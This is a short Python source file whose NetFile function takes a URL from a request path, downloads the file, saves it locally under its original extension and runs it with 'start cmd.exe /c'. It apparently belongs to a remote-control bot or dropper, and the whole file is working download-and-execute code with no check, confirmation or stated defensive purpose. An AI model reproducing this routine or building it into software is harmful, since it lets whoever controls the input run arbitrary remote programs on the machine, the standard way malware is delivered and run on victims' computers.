import os
from c_sys import c_command
#from urllib.parse import unquote
def NetFile(path, req):
  try:
    http_path = path.replace(b"/file/", b"")
    #http = unquote(file_path)
    http_t = http_path.split(b".")
    h_len = len(http_t)
    ext = b""
    if h_len > 0:
      ext = http_t[h_len - 1]
    data = req.get(http_path)
    data_bin = data.content
    if ext:
      apath = os.path.abspath(b"file." + ext)
      fp = open(apath, "wb")
      fp.write(data_bin)
      fp.close()
      c_command(b"start cmd.exe /c \"" + apath + b"\"")
  except Exception as er:
    print(er)